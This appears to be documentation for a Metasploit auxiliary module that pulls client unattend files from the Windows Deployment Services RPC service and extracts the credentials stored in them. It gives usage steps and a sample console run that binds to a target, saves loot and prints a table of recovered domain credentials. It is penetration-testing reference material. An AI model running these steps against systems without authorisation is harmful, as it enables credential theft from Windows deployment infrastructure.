## Vulnerable Application

This module retrieves the client unattend file from Windows Deployment Services RPC service and parses out the stored credentials. Tested against Windows 2008 R2 x64 and Windows 2003 x86.

More information can be found on the [Rapid7 Vulnerability & Exploit Database page](https://www.rapid7.com/db/modules/auxiliary/scanner/dcerpc/windows_deployment_services) and pull request #1420 (https://github.com/rapid7/metasploit-framework/pull/1420).

## Verification Steps

  1. Start msfconsole
  2. Do: `use modules/auxiliary/scanner/dcerpc/windows_deployment_services`
  3. set RHOST [ip]
  4. Do: `run`

## Scenarios

### A run on Windows Server 2008

  ```
  msf > use modules/auxiliary/scanner/dcerpc/windows_deployment_services
  msf auxiliary(scanner/dcerpc/windows_deployment_services) > show options
  msf auxiliary(scanner/dcerpc/windows_deployment_services) > set RHOST 192.168.5.1
  msf auxiliary(scanner/dcerpc/windows_deployment_services) > run

    [*] Binding to 1A927394-352E-4553-AE3F-7CF4AAFCA620:1.0:71710533-beba-4937-8319-b5dbef9ccc36:1@ncacn_ip_tcp:192.168.5.1[5040] ...
    [+] Bound to 1A927394-352E-4553-AE3F-7CF4AAFCA620:1.0:71710533-beba-4937-8319-b5dbef9ccc36:1@ncacn_ip_tcp:192.168.5.1[5040]
    [*] Sending X64 Client Unattend request ...
    [*] Raw version of X64 saved as: C:/Documents and Settings/user/.msf5/loot/20121213104745_default_192.168.5.1_windows.unattend_399005.txt
    [+] Retrieved wds credentials for X64
    [*] Sending X86 Client Unattend request ...
    [*] Sending IA64 Client Unattend request ...

      Windows Deployment Services
      ===========================

      Architecture  Type  Domain        Username  Password
      ------------  ----  ------        --------  --------
      X64           wds   Fabrikam.com  username  my_password

    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
  ```
